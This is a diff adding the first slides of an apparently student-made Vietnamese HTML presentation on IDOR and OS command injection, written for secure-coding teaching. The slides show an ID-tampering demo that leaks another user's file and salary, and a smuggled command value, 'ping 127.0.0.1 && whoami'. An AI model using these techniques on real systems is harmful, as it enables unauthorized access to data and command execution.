@@ -1,0 +1,1877 @@
+<!DOCTYPE html>
+<html lang="vi" class="dark">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Phân Tích Chuyên Sâu: IDOR & OS Command Injection | An Toàn Thông Tin</title>
+
+  <!-- Google Fonts: Vietnamese-friendly modern UI + crisp monospace -->
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Be+Vietnam+Pro:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet" />
+
+  <!-- TailwindCSS CDN -->
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script>
+    tailwind.config = {
+      darkMode: 'class',
+      theme: {
+        extend: {
+          fontFamily: {
+            sans: ['"Be Vietnam Pro"', 'system-ui', 'sans-serif'],
+            mono: ['"JetBrains Mono"', 'ui-monospace', 'SFMono-Regular', 'monospace'],
+          },
+          colors: {
+            cyber: {
+              bg: '#0f172a',
+              card: '#1e293b',
+              border: '#334155',
+              danger: '#ef4444',
+              safe: '#10b981',
+              accent: '#38bdf8',
+              warn: '#f59e0b',
+            }
+          }
+        }
+      }
+    };
+  </script>
+
+  <!-- Lucide Icons CDN -->
+  <script src="https://unpkg.com/lucide@latest"></script>
+
+  <style>
+    :root {
+      color-scheme: dark;
+    }
+    html, body {
+      margin: 0;
+      padding: 0;
+      background-color: #0f172a;
+      color: #f8fafc;
+      overflow: hidden;
+      height: 100%;
+      width: 100%;
+      user-select: none;
+    }
+
+    /* Subtle cyber grid background */
+    .cyber-grid {
+      background-image:
+        radial-gradient(circle at 15% 20%, rgba(56, 189, 248, 0.08) 0%, transparent 40%),
+        radial-gradient(circle at 85% 80%, rgba(239, 68, 68, 0.07) 0%, transparent 45%),
+        linear-gradient(to right, rgba(148, 163, 184, 0.05) 1px, transparent 1px),
+        linear-gradient(to bottom, rgba(148, 163, 184, 0.05) 1px, transparent 1px);
+      background-size: 100% 100%, 100% 100%, 40px 40px, 40px 40px;
+    }
+
+    /* Slide transitions */
+    @keyframes slideEnter {
+      from {
+        opacity: 0;
+        transform: translateY(12px) scale(0.992);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0) scale(1);
+      }
+    }
+    .slide {
+      display: none;
+    }
+    .slide.active {
+      display: flex;
+      animation: slideEnter 0.35s cubic-bezier(0.16, 1, 0.3, 1) forwards;
+    }
+
+    /* Custom subtle scrollbars for mockups */
+    .custom-scroll::-webkit-scrollbar {
+      width: 6px;
+      height: 6px;
+    }
+    .custom-scroll::-webkit-scrollbar-track {
+      background: #0f172a;
+      border-radius: 9999px;
+    }
+    .custom-scroll::-webkit-scrollbar-thumb {
+      background: #334155;
+      border-radius: 9999px;
+    }
+    .custom-scroll::-webkit-scrollbar-thumb:hover {
+      background: #475569;
+    }
+
+    /* Code syntax colors */
+    .tok-kw { color: #c084fc; }
+    .tok-fn { color: #60a5fa; }
+    .tok-str { color: #34d399; }
+    .tok-num { color: #fbbf24; }
+    .tok-cmt { color: #64748b; font-style: italic; }
+    .tok-dec { color: #f472b6; }
+    .tok-var { color: #e2e8f0; }
+    .tok-op { color: #38bdf8; }
+    .tok-danger { color: #fca5a5; font-weight: 700; }
+
+    /* Pulse glow for critical callouts */
+    @keyframes dangerPulse {
+      0%, 100% { box-shadow: 0 0 0 0 rgba(239, 68, 68, 0.35); }
+      50% { box-shadow: 0 0 22px 2px rgba(239, 68, 68, 0.25); }
+    }
+    .glow-danger {
+      animation: dangerPulse 2.8s infinite;
+    }
+
+    @keyframes safePulse {
+      0%, 100% { box-shadow: 0 0 0 0 rgba(16, 185, 129, 0.3); }
+      50% { box-shadow: 0 0 20px 2px rgba(16, 185, 129, 0.22); }
+    }
+    .glow-safe {
+      animation: safePulse 3s infinite;
+    }
+
+    /* Selectable code blocks */
+    pre, code {
+      user-select: text;
+    }
+  </style>
+</head>
+<body class="cyber-grid font-sans antialiased text-slate-100 flex flex-col h-screen w-screen overflow-hidden">
+
+  <!-- Top Progress Bar -->
+  <div class="w-full h-1.5 bg-slate-800/90 relative z-40 shrink-0">
+    <div id="progressBar" class="h-full bg-gradient-to-r from-sky-400 via-red-500 to-emerald-400 transition-all duration-500 ease-out" style="width: 8.33%;"></div>
+  </div>
+
+  <!-- Top Navigation Header -->
+  <header class="w-full px-6 md:px-10 pt-3 pb-2 flex items-center justify-between shrink-0 z-30 border-b border-slate-800/70 bg-slate-900/60 backdrop-blur-md">
+    <div class="flex items-center gap-3">
+      <div class="w-8 h-8 rounded-lg bg-slate-800 border border-slate-700 flex items-center justify-center text-sky-400 shadow-inner">
+        <i data-lucide="shield-alert" class="w-4 h-4"></i>
+      </div>
+      <div class="flex items-center gap-2 text-xs md:text-sm">
+        <span class="font-bold tracking-wide text-slate-200 uppercase">An Toàn Thông Tin</span>
+        <span class="text-slate-600">/</span>
+        <span id="sectionBadge" class="px-2.5 py-0.5 rounded-full text-xs font-semibold bg-sky-500/15 text-sky-300 border border-sky-500/30">
+          Giới thiệu chung
+        </span>
+      </div>
+    </div>
+
+    <div class="flex items-center gap-3">
+      <div class="hidden sm:flex items-center gap-1.5 text-xs text-slate-400 bg-slate-800/80 px-3 py-1 rounded-full border border-slate-700/70">
+        <span class="w-2 h-2 rounded-full bg-red-500"></span>
+        <span>Lỗ hổng / Tấn công</span>
+        <span class="mx-1.5 text-slate-600">|</span>
+        <span class="w-2 h-2 rounded-full bg-emerald-500"></span>
+        <span>Phòng thủ / An toàn</span>
+      </div>
+      <button id="btnOverviewTop" onclick="toggleOverview()" title="Xem tất cả slide (Phím G)" class="px-2.5 py-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 border border-slate-700 text-slate-300 hover:text-white text-xs font-medium flex items-center gap-1.5 transition">
+        <i data-lucide="layout-grid" class="w-3.5 h-3.5"></i>
+        <span class="hidden md:inline">Danh sách Slide</span>
+      </button>
+    </div>
+  </header>
+
+  <!-- Main Presentation Stage -->
+  <main id="stage" class="flex-1 relative overflow-y-auto custom-scroll px-6 md:px-10 py-4 flex items-center justify-center">
+    <div class="w-full max-w-7xl mx-auto">
+
+      <!-- =================================================================== -->
+      <!-- SLIDE 1: TITLE SLIDE                                                -->
+      <!-- =================================================================== -->
+      <section class="slide active flex-col justify-center min-h-[72vh]" data-slide="1" data-section="Trang bìa" data-theme="sky" data-title="Phân tích chuyên sâu: IDOR & OS Command Injection">
+        <div class="grid grid-cols-1 lg:grid-cols-12 gap-8 items-center">
+          <!-- Left Hero Copy -->
+          <div class="lg:col-span-7 space-y-6">
+            <div class="inline-flex items-center gap-2 px-3.5 py-1.5 rounded-full bg-red-500/15 border border-red-500/35 text-red-300 text-xs font-semibold tracking-wider uppercase">
+              <i data-lucide="terminal" class="w-3.5 h-3.5"></i>
+              <span>OWASP Top 10:2025 • Web Application Security</span>
+            </div>
+
+            <h1 class="text-3xl sm:text-4xl lg:text-5xl font-extrabold leading-tight tracking-tight text-white">
+              PHÂN TÍCH CHUYÊN SÂU:
+              <span class="block mt-2 bg-gradient-to-r from-red-400 via-amber-300 to-emerald-400 bg-clip-text text-transparent">
+                LỖ HỔNG IDOR &amp; OS COMMAND INJECTION
+              </span>
+            </h1>
+
+            <p class="text-base sm:text-lg text-slate-300 leading-relaxed max-w-2xl">
+              Cơ chế phát sinh trong mã nguồn, Kịch bản khai thác thực tế &amp; Nguyên tắc lập trình phòng thủ
+            </p>
+
+            <!-- Course Info Card -->
+            <div class="bg-slate-800/80 border border-slate-700/80 rounded-2xl p-5 flex flex-wrap items-center gap-6 shadow-xl">
+              <div class="flex items-center gap-3">
+                <div class="w-11 h-11 rounded-xl bg-sky-500/15 border border-sky-500/30 flex items-center justify-center text-sky-400">
+                  <i data-lucide="graduation-cap" class="w-5 h-5"></i>
+                </div>
+                <div>
+                  <div class="text-xs uppercase tracking-wider text-slate-400 font-semibold">Môn học</div>
+                  <div class="text-sm sm:text-base font-bold text-white">An toàn Thông tin (Information Security)</div>
+                </div>
+              </div>
+              <div class="h-10 w-px bg-slate-700 hidden sm:block"></div>
+              <div class="flex items-center gap-3">
+                <div class="w-11 h-11 rounded-xl bg-emerald-500/15 border border-emerald-500/30 flex items-center justify-center text-emerald-400">
+                  <i data-lucide="users" class="w-5 h-5"></i>
+                </div>
+                <div>
+                  <div class="text-xs uppercase tracking-wider text-slate-400 font-semibold">Thực hiện</div>
+                  <div class="text-sm sm:text-base font-bold text-white">Nhóm trình bày • Đại học</div>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <!-- Right Visual Architecture Preview -->
+          <div class="lg:col-span-5 space-y-4">
+            <!-- Pillar 1 -->
+            <div class="bg-slate-800/90 border border-red-500/40 rounded-2xl p-5 shadow-2xl relative overflow-hidden group">
+              <div class="absolute top-0 right-0 w-28 h-28 bg-red-500/10 rounded-bl-full pointer-events-none"></div>
+              <div class="flex items-start justify-between gap-3 mb-3">
+                <span class="px-2.5 py-1 rounded-md bg-red-500/20 text-red-300 font-mono text-xs font-bold border border-red-500/40">PHẦN 1 • A01:2025</span>
+                <span class="text-xs font-bold text-red-400 flex items-center gap-1"><i data-lucide="flame" class="w-3.5 h-3.5"></i> TOP 1 OWASP</span>
+              </div>
+              <h3 class="text-lg font-bold text-white mb-1">IDOR — Broken Access Control</h3>
+              <p class="text-xs text-slate-400 mb-3">Thiếu kiểm tra phân quyền đối tượng khi xử lý tham số ID từ phía client.</p>
+              <div class="font-mono text-xs bg-slate-950/90 border border-slate-700 rounded-lg px-3 py-2 text-slate-300 flex items-center justify-between">
+                <span>/download?file_id=<span class="text-emerald-400 line-through">1</span> <span class="text-red-400 font-bold">→ 3</span></span>
+                <span class="text-[11px] px-1.5 py-0.5 rounded bg-red-500/20 text-red-300">200 OK</span>
+              </div>
+            </div>
+
+            <!-- Pillar 2 -->
+            <div class="bg-slate-800/90 border border-amber-500/40 rounded-2xl p-5 shadow-2xl relative overflow-hidden">
+              <div class="absolute top-0 right-0 w-28 h-28 bg-amber-500/10 rounded-bl-full pointer-events-none"></div>
+              <div class="flex items-start justify-between gap-3 mb-3">
+                <span class="px-2.5 py-1 rounded-md bg-amber-500/20 text-amber-300 font-mono text-xs font-bold border border-amber-500/40">PHẦN 2 • A05:2025</span>
+                <span class="text-xs font-bold text-amber-400 flex items-center gap-1"><i data-lucide="skull" class="w-3.5 h-3.5"></i> RCE CRITICAL</span>
+              </div>
+              <h3 class="text-lg font-bold text-white mb-1">OS Command Injection</h3>
+              <p class="text-xs text-slate-400 mb-3">Chèn lệnh hệ điều hành trái phép qua chuỗi đầu vào không lọc với <code class="text-red-300">shell=True</code>.</p>
+              <div class="font-mono text-xs bg-slate-950/90 border border-slate-700 rounded-lg px-3 py-2 text-slate-300 flex items-center justify-between">
+                <span>ping 127.0.0.1 <span class="text-red-400 font-bold">&amp;&amp; whoami</span></span>
+                <span class="text-[11px] px-1.5 py-0.5 rounded bg-red-500/20 text-red-300">ROOT SHELL</span>
+              </div>
+            </div>
+
+            <!-- Defense Pill -->
+            <div class="bg-emerald-500/10 border border-emerald-500/35 rounded-xl px-4 py-3 flex items-center gap-3">
+              <i data-lucide="shield-check" class="w-5 h-5 text-emerald-400 shrink-0"></i>
+              <span class="text-xs sm:text-sm text-emerald-200 font-medium">Mục tiêu: Hiểu tận gốc dòng code lỗi &amp; làm chủ lập trình phòng thủ (Secure Coding).</span>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- =================================================================== -->
+      <!-- SLIDE 2: PHẦN 1 - IDOR & OWASP TOP 10:2025                          -->
+      <!-- =================================================================== -->
+      <section class="slide flex-col justify-center min-h-[72vh]" data-slide="2" data-section="Phần 1: IDOR" data-theme="danger" data-title="IDOR & Vị trí trên OWASP Top 10:2025">
+        <div class="mb-5">
+          <div class="inline-flex items-center gap-2 text-xs font-bold uppercase tracking-wider text-red-400 mb-1">
+            <i data-lucide="lock-open" class="w-4 h-4"></i> Phần 1 — Insecure Direct Object References (IDOR)
+          </div>
+          <h2 class="text-2xl sm:text-3xl font-extrabold text-white">IDOR &amp; Vị Trí Số 1 Trên OWASP Top 10:2025</h2>
+        </div>
+
+        <div class="grid grid-cols-1 lg:grid-cols-12 gap-6 items-stretch">
+          <!-- Left: Core Concepts & 3 Reasons -->
+          <div class="lg:col-span-6 flex flex-col justify-between gap-4">
+            <div class="bg-slate-800/90 border border-slate-700 rounded-2xl p-5">
+              <div class="flex items-center gap-2.5 mb-2">
+                <span class="px-2.5 py-0.5 rounded bg-red-500/20 border border-red-500/40 text-red-300 font-mono text-xs font-bold">A01:2025</span>
+                <h3 class="text-base font-bold text-white">Broken Access Control — Ngôi Vương Nguy Hiểm</h3>
+              </div>
+              <p class="text-sm text-slate-300 leading-relaxed">
+                <strong class="text-white">IDOR</strong> xảy ra khi ứng dụng dùng trực tiếp định danh do người dùng gửi lên (<code class="text-red-300 bg-slate-900 px-1.5 py-0.5 rounded">file_id</code>, <code class="text-red-300 bg-slate-900 px-1.5 py-0.5 rounded">user_id</code>) để truy xuất tài nguyên mà <strong class="text-red-300">không kiểm tra quyền sở hữu</strong>.
+              </p>
+            </div>
+
+            <div class="space-y-3 flex-1 flex flex-col justify-center">
+              <div class="text-xs font-bold uppercase tracking-wider text-slate-400">3 Lý do cốt lõi khiến IDOR giữ Top 1:</div>
+
+              <div class="bg-slate-800/80 border-l-4 border-red-500 border-y border-r border-slate-700/80 rounded-r-xl p-4 flex items-start gap-3.5">
+                <div class="w-9 h-9 rounded-lg bg-red-500/15 text-red-400 flex items-center justify-center shrink-0 mt-0.5">
+                  <i data-lucide="eye-off" class="w-5 h-5"></i>
+                </div>
+                <div>
+                  <h4 class="text-sm font-bold text-white">1. Tàng hình trước WAF &amp; IDS</h4>
+                  <p class="text-xs text-slate-300 mt-0.5">Request HTTP hoàn toàn hợp lệ về cú pháp (chỉ đổi số <code class="text-amber-300">1 → 3</code>), không chứa ký tự đặc biệt hay chữ ký tấn công để tường lửa chặn.</p>
+                </div>
+              </div>
+
+              <div class="bg-slate-800/80 border-l-4 border-red-500 border-y border-r border-slate-700/80 rounded-r-xl p-4 flex items-start gap-3.5">
+                <div class="w-9 h-9 rounded-lg bg-red-500/15 text-red-400 flex items-center justify-center shrink-0 mt-0.5">
+                  <i data-lucide="zap" class="w-5 h-5"></i>
+                </div>
+                <div>
+                  <h4 class="text-sm font-bold text-white">2. Rào cản kỹ thuật bằng 0</h4>
+                  <p class="text-xs text-slate-300 mt-0.5">Không cần exploit phức tạp hay công cụ chuyên sâu — chỉ cần trình duyệt web hoặc nhấn <kbd class="px-1.5 py-0.5 bg-slate-900 border border-slate-600 rounded text-[11px] font-mono text-slate-200">F12</kbd> là có thể khai thác ngay.</p>
+                </div>
+              </div>
+
+              <div class="bg-slate-800/80 border-l-4 border-red-500 border-y border-r border-slate-700/80 rounded-r-xl p-4 flex items-start gap-3.5">
+                <div class="w-9 h-9 rounded-lg bg-red-500/15 text-red-400 flex items-center justify-center shrink-0 mt-0.5">
+                  <i data-lucide="database-zap" class="w-5 h-5"></i>
+                </div>
+                <div>
+                  <h4 class="text-sm font-bold text-white">3. Thiệt hại diện rộng (Mass Exposure)</h4>
+                  <p class="text-xs text-slate-300 mt-0.5">Dễ dàng tự động hóa vòng lặp để hút cạn toàn bộ CSDL người dùng, hồ sơ tài chính, tài liệu mật hoặc chiếm quyền tài khoản.</p>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <!-- Right: OWASP Top 10:2025 Visual Ranking Board -->
+          <div class="lg:col-span-6 bg-slate-800/90 border border-slate-700 rounded-2xl p-5 flex flex-col justify-between shadow-2xl">
+            <div class="flex items-center justify-between pb-3 mb-3 border-b border-slate-700">
+              <div class="flex items-center gap-2">
+                <i data-lucide="bar-chart-3" class="w-5 h-5 text-red-400"></i>
+                <span class="font-bold text-sm text-white uppercase tracking-wide">Bảng xếp hạng OWASP Top 10:2025</span>
+              </div>
+              <span class="text-[11px] font-mono px-2 py-0.5 rounded bg-red-500/20 text-red-300 border border-red-500/40">FOCUS: #1</span>
+            </div>
+
+            <div class="space-y-2.5 flex-1">
+              <!-- #1 HIGHLIGHTED -->
+              <div class="glow-danger bg-gradient-to-r from-red-500/25 via-red-500/15 to-slate-900 border-2 border-red-500 rounded-xl p-3.5 relative">
+                <div class="flex items-center justify-between gap-2">
+                  <div class="flex items-center gap-3">
+                    <div class="w-9 h-9 rounded-lg bg-red-500 text-white font-extrabold flex items-center justify-center text-base shadow-lg shrink-0">#1</div>
+                    <div>
+                      <div class="text-sm sm:text-base font-extrabold text-white flex items-center gap-2">
+                        A01:2025 – Broken Access Control
+                      </div>
+                      <div class="text-xs text-red-200 font-medium mt-0.5">Bao gồm: IDOR, Privilege Escalation, Force Browsing</div>
+                    </div>
+                  </div>
+                  <span class="px-2.5 py-1 rounded-full bg-red-600 text-white text-[11px] font-extrabold uppercase tracking-wider shrink-0">TOP 1 • IDOR</span>
+                </div>
+                <div class="mt-2.5 w-full bg-slate-900/90 rounded-full h-2 overflow-hidden">
+                  <div class="bg-gradient-to-r from-red-500 to-rose-400 h-full rounded-full" style="width: 96%;"></div>
+                </div>
+              </div>
+
+              <!-- #2 - #6 muted -->
+              <div class="bg-slate-900/70 border border-slate-700/70 rounded-lg px-3.5 py-2.5 flex items-center justify-between opacity-80">
+                <div class="flex items-center gap-3">
+                  <span class="font-mono text-xs font-bold text-slate-400 w-6">#2</span>
+                  <span class="text-xs sm:text-sm text-slate-300 font-medium">A02:2025 – Security Misconfiguration</span>
+                </div>
+                <div class="w-24 bg-slate-800 h-1.5 rounded-full overflow-hidden"><div class="bg-slate-500 h-full" style="width: 78%;"></div></div>
+              </div>
+
+              <div class="bg-slate-900/70 border border-slate-700/70 rounded-lg px-3.5 py-2.5 flex items-center justify-between opacity-75">
+                <div class="flex items-center gap-3">
+                  <span class="font-mono text-xs font-bold text-slate-400 w-6">#3</span>
+                  <span class="text-xs sm:text-sm text-slate-300 font-medium">A03:2025 – Software Supply Chain Failures</span>
+                </div>
+                <div class="w-24 bg-slate-800 h-1.5 rounded-full overflow-hidden"><div class="bg-slate-500 h-full" style="width: 70%;"></div></div>
+              </div>
+
+              <div class="bg-slate-900/70 border border-slate-700/70 rounded-lg px-3.5 py-2.5 flex items-center justify-between opacity-70">
+                <div class="flex items-center gap-3">
+                  <span class="font-mono text-xs font-bold text-slate-400 w-6">#4</span>
+                  <span class="text-xs sm:text-sm text-slate-300 font-medium">A04:2025 – Cryptographic Failures</span>
+                </div>
+                <div class="w-24 bg-slate-800 h-1.5 rounded-full overflow-hidden"><div class="bg-slate-500 h-full" style="width: 64%;"></div></div>
+              </div>
+
+              <div class="bg-slate-900/70 border border-slate-700/70 rounded-lg px-3.5 py-2.5 flex items-center justify-between opacity-75">
+                <div class="flex items-center gap-3">
+                  <span class="font-mono text-xs font-bold text-amber-400/80 w-6">#5</span>
+                  <span class="text-xs sm:text-sm text-slate-300 font-medium">A05:2025 – Injection <span class="text-[11px] text-amber-400/90 ml-1">(Phần 2)</span></span>
+                </div>
+                <div class="w-24 bg-slate-800 h-1.5 rounded-full overflow-hidden"><div class="bg-amber-500/60 h-full" style="width: 58%;"></div></div>
+              </div>
+
+              <div class="bg-slate-900/50 border border-slate-800 rounded-lg px-3.5 py-2 flex items-center justify-between opacity-55">
+                <div class="flex items-center gap-3">
+                  <span class="font-mono text-xs text-slate-500 w-6">#6–10</span>
+                  <span class="text-xs text-slate-400">Insecure Design, Auth Failures, Data Integrity, Logging, Mishandling...</span>
+                </div>
+              </div>
+            </div>
+
+            <div class="mt-3 pt-3 border-t border-slate-700/80 flex items-center justify-between text-xs text-slate-400">
+              <span>Nguồn: OWASP Top 10:2025 Standard</span>
+              <span class="text-red-400 font-semibold">Xuất hiện trên &gt;94% ứng dụng kiểm thử</span>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- =================================================================== -->
+      <!-- SLIDE 3: IDOR - TRỰC QUAN HÓA TRÊN URL & F12 DEVTOOLS               -->
+      <!-- =================================================================== -->
+      <section class="slide flex-col justify-center min-h-[72vh]" data-slide="3" data-section="Phần 1: IDOR" data-theme="danger" data-title="IDOR — Trực quan hóa trên URL & F12 DevTools">
+        <div class="flex flex-wrap items-end justify-between gap-3 mb-4">
+          <div>
+            <div class="text-xs font-bold uppercase tracking-wider text-red-400 mb-1">Nhận diện bề mặt tấn công (Attack Surface)</div>
+            <h2 class="text-2xl sm:text-3xl font-extrabold text-white">IDOR — Lộ Thiên Trên URL &amp; Ẩn Trong F12 DevTools</h2>
+          </div>
+          <button onclick="toggleSlide3Demo()" id="btnSlide3Toggle" class="px-3.5 py-1.5 rounded-lg bg-red-500/20 hover:bg-red-500/30 border border-red-500/50 text-red-200 text-xs font-semibold flex items-center gap-2 transition">
+            <i data-lucide="play" class="w-3.5 h-3.5"></i>
+            <span>Nhấn để mô phỏng thao túng ID</span>
+          </button>
+        </div>
+
+        <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
+          <!-- KHUNG 1: BROWSER ADDRESS BAR -->
+          <div class="bg-slate-800/90 border border-slate-700 rounded-2xl overflow-hidden shadow-2xl flex flex-col">
+            <!-- Browser Window Chrome -->
+            <div class="bg-slate-900 px-4 py-2.5 border-b border-slate-700 flex items-center justify-between">
+              <div class="flex items-center gap-2">
+                <span class="w-3 h-3 rounded-full bg-red-500/80"></span>
+                <span class="w-3 h-3 rounded-full bg-amber-400/80"></span>
+                <span class="w-3 h-3 rounded-full bg-emerald-500/80"></span>
+                <span class="ml-2 text-xs font-semibold text-slate-300 flex items-center gap-1.5">
+                  <i data-lucide="globe" class="w-3.5 h-3.5 text-sky-400"></i>
+                  Khung 1: ID lộ thiên trên thanh địa chỉ Browser
+                </span>
+              </div>
+              <span class="text-[11px] font-mono px-2 py-0.5 rounded bg-slate-800 text-sky-300 border border-slate-700">GET Parameter</span>
+            </div>
+
+            <div class="p-5 space-y-4 flex-1 flex flex-col justify-between">
+              <!-- Legitimate State -->
+              <div class="space-y-2">
+                <div class="flex items-center justify-between text-xs">
+                  <span class="font-semibold text-emerald-400 flex items-center gap-1.5">
+                    <i data-lucide="user-check" class="w-3.5 h-3.5"></i> Tài khoản đăng nhập: User Hải (ID = 1)
+                  </span>
+                  <span class="text-slate-400">Hợp lệ</span>
+                </div>
+                <div class="bg-slate-950 border border-slate-700 rounded-xl px-3.5 py-2.5 flex items-center gap-2.5 font-mono text-xs sm:text-sm">
+                  <i data-lucide="lock" class="w-3.5 h-3.5 text-emerald-400 shrink-0"></i>
+                  <span class="text-slate-400 truncate">https://corpdrive.local/drive/download?file_id=<span class="px-1.5 py-0.5 rounded bg-emerald-500/20 text-emerald-300 font-bold border border-emerald-500/40">1</span></span>
+                </div>
+                <div class="flex items-center gap-2 text-xs text-slate-400 pl-2">
+                  <i data-lucide="file-text" class="w-3.5 h-3.5 text-slate-400"></i>
+                  <span>Tải về: <span class="text-slate-200 font-mono">Bao_cao_Ca_nhan_Hai.pdf</span> (Đúng chủ sở hữu)</span>
+                </div>
+              </div>
+
+              <!-- Red Transformation Arrow -->
+              <div class="flex items-center justify-center py-1">
+                <div class="flex items-center gap-2.5 px-4 py-1.5 rounded-full bg-red-500/15 border border-red-500/40 text-red-300 text-xs font-bold">
+                  <i data-lucide="arrow-down" class="w-4 h-4 text-red-400 animate-bounce"></i>
+                  <span>Attacker tự sửa trực tiếp <code class="font-mono text-white">file_id=1</code> → <code class="font-mono text-red-300">file_id=3</code></span>
+                </div>
+              </div>
+
+              <!-- Exploited State -->
+              <div id="slide3BrowserAttack" class="space-y-2.5 p-3.5 rounded-xl bg-red-500/10 border border-red-500/40 transition-all duration-300">
+                <div class="bg-slate-950 border-2 border-red-500/70 rounded-xl px-3.5 py-2.5 flex items-center gap-2.5 font-mono text-xs sm:text-sm shadow-lg">
+                  <i data-lucide="alert-triangle" class="w-4 h-4 text-red-400 shrink-0"></i>
+                  <span class="text-slate-200 truncate">
+                    https://corpdrive.local/drive/download?file_id=<span class="inline-flex items-center justify-center w-7 h-7 rounded-full bg-red-500/30 text-red-200 font-extrabold border-2 border-red-500 shadow-md ml-0.5">3</span>
+                  </span>
+                </div>
+
+                <!-- Stolen File Download Card -->
+                <div class="bg-slate-900/95 border border-red-500/40 rounded-lg p-3 flex items-center justify-between gap-3">
+                  <div class="flex items-center gap-3">
+                    <div class="w-9 h-9 rounded-lg bg-red-500/20 text-red-400 flex items-center justify-center shrink-0">
+                      <i data-lucide="file-warning" class="w-5 h-5"></i>
+                    </div>
+                    <div>
+                      <div class="text-xs font-mono font-bold text-red-300">Bang_luong_Giam_Doc.txt</div>
+                      <div class="text-[11px] text-slate-400">Tài liệu mật của Giám đốc — Tải trộm thành công!</div>
+                    </div>
+                  </div>
+                  <span class="px-2 py-1 rounded bg-red-500/20 text-red-300 font-mono text-[11px] font-bold border border-red-500/40 shrink-0">200 OK</span>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <!-- KHUNG 2: F12 DEVTOOLS NETWORK TAB -->
+          <div class="bg-slate-800/90 border border-slate-700 rounded-2xl overflow-hidden shadow-2xl flex flex-col">
+            <!-- Browser Bar showing CLEAN URL -->
+            <div class="bg-slate-900 px-4 py-2.5 border-b border-slate-700 flex items-center justify-between">
+              <div class="flex items-center gap-2">
+                <i data-lucide="bug" class="w-4 h-4 text-amber-400"></i>
+                <span class="text-xs font-semibold text-slate-200">Khung 2: ID ẩn trong gói tin API (F12 Network Tab)</span>
+              </div>
+              <span class="text-[11px] font-mono px-2 py-0.5 rounded bg-amber-500/15 text-amber-300 border border-amber-500/30">POST JSON</span>
+            </div>
+
+            <div class="p-4 space-y-3 flex-1 flex flex-col">
+              <!-- Clean URL deception -->
+              <div class="bg-slate-950 border border-slate-700 rounded-lg px-3 py-2 flex items-center justify-between font-mono text-xs">
+                <div class="flex items-center gap-2">
+                  <i data-lucide="lock" class="w-3.5 h-3.5 text-emerald-400"></i>
+                  <span class="text-slate-200">https://corpdrive.local/profile</span>
+                </div>
+                <span class="text-[10px] px-2 py-0.5 rounded bg-emerald-500/15 text-emerald-300 border border-emerald-500/30">URL sạch, không lộ ID!</span>
+              </div>
+
+              <!-- DevTools Mockup Frame -->
+              <div class="bg-[#0d1117] border border-slate-700 rounded-xl overflow-hidden flex-1 flex flex-col font-mono text-xs">
+                <!-- DevTools Top Tabs -->
+                <div class="bg-slate-900 border-b border-slate-700 px-3 pt-2 flex items-center gap-4 text-[11px] text-slate-400">
+                  <span>Elements</span>
+                  <span>Console</span>
+                  <span class="text-sky-400 font-bold border-b-2 border-sky-400 pb-1.5">Network</span>
+                  <span>Application</span>
+                  <span class="ml-auto text-[10px] text-slate-500 pb-1.5">Chrome DevTools (F12)</span>
+                </div>
+
+                <!-- Split Network Pane -->
+                <div class="grid grid-cols-12 flex-1 divide-x divide-slate-800">
+                  <!-- Request List -->
+                  <div class="col-span-4 p-2 space-y-1 bg-slate-950/60">
+                    <div class="text-[10px] text-slate-500 uppercase px-1.5 pb-1 border-b border-slate-800">Name</div>
+                    <div class="px-1.5 py-1 text-slate-400 text-[11px] truncate">profile</div>
+                    <div class="px-1.5 py-1 text-slate-400 text-[11px] truncate">app.bundle.js</div>
+                    <div class="px-1.5 py-1.5 rounded bg-sky-500/20 border border-sky-500/40 text-sky-300 font-bold text-[11px] flex items-center justify-between">
+                      <span class="truncate">/api/profile</span>
+                      <span class="text-[10px] text-emerald-400">200</span>
+                    </div>
+                    <div class="px-1.5 py-1 text-slate-500 text-[11px] truncate">avatar.png</div>
+                  </div>
+
+                  <!-- Request Details / Payload -->
+                  <div class="col-span-8 p-3 flex flex-col justify-between gap-2.5">
+                    <div>
+                      <div class="flex items-center gap-3 text-[11px] border-b border-slate-800 pb-1.5 mb-2.5">
+                        <span class="text-slate-500">Headers</span>
+                        <span class="text-red-400 font-bold border-b border-red-400 pb-1">Payload</span>
+                        <span class="text-slate-500">Preview</span>
+                        <span class="text-slate-500">Response</span>
+                      </div>
+
+                      <div class="text-[11px] text-slate-400 mb-1.5">Request Payload (JSON):</div>
+                      <div id="slide3PayloadBox" class="bg-slate-900 border border-red-500/40 rounded-lg p-3 leading-relaxed">
+                        <div class="text-slate-400">{</div>
+                        <div class="pl-4 flex items-center flex-wrap gap-1.5">
+                          <span class="text-sky-300">"user_id"</span><span class="text-slate-400">:</span>
+                          <span class="px-1.5 py-0.5 rounded bg-red-500/20 text-red-300 line-through">1</span>
+                          <span class="text-red-400 font-bold">→</span>
+                          <span class="px-2 py-0.5 rounded bg-red-500 text-white font-extrabold shadow">2</span>
+                          <span class="text-[10px] text-red-300 ml-1">// Sửa qua DevTools / Burp</span>
+                        </div>
+                        <div class="text-slate-400">}</div>
+                      </div>
+                    </div>
+
+                    <!-- Leaked Response Preview -->
+                    <div class="bg-red-500/10 border border-red-500/35 rounded-lg p-2.5 text-[11px]">
+                      <div class="text-red-300 font-bold mb-1 flex items-center gap-1.5">
+                        <i data-lucide="shield-x" class="w-3.5 h-3.5"></i> Response rò rỉ hồ sơ User #2:
+                      </div>
+                      <div class="text-slate-300">
+                        {"id": <span class="text-red-300 font-bold">2</span>, "name": <span class="text-amber-300">"Trần Minh (GĐ)"</span>, "salary": <span class="text-red-300">"120.000.000₫"</span>}
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- =================================================================== -->
+      <!-- SLIDE 4: IDOR - SOI CHIẾU DÒNG CODE GÂY LỖI                         -->
+      <!-- =================================================================== -->
